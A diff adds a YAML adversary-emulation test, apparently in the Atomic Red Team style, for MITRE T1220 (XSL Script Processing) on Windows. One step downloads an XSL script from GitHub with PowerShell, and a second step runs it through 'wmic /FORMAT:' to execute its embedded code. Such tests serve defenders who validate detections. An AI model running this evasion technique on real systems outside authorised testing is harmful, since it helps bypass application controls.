@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: WMIC bypass using local XSL file
+description: |
+    Executes the code specified within a XSL script using a local payload.
+args:
+    - name: wmic_command
+      type: string
+      default: process list
+    - name: local_xsl_file
+      type: path
+      default: PathToAtomicsFolder\T1220\src\wmicscript.xsl
+uuid: 1b237334-3e21-4a0c-8178-b8c996124988
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1220: XSL Script Processing'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        XSL file must exist on disk at specified location (#{local_xsl_file})
+      inline: |
+        if (Test-Path "#{local_xsl_file}") {exit 0} else {{New-Item -Type Directory (split-path "#{local_xsl_file}") -ErrorAction Ignore | Out-Null
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
+        }}
+      executor: powershell
+    - name: wmic-bypass-using-local-xsl-file
+      inline: |
+        wmic {{.Args.wmic_command}} /FORMAT:"{{.Args.local_xsl_file}}"
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
